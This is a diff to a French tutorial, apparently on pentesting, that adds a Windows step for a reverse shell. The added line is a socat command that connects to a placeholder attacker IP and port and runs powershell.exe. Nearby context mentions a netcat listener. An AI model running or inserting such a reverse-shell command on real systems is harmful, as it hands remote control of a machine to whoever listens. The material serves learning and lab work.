@@ -17,6 +17,8 @@ Cette commande est équivalente à faire **`nc -vnlp 1234`**.
 
 Sur la machine cible, on va effectuer la commande :
 
-```shell
+1) Sur une machine windows
 
+```shell
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 ```
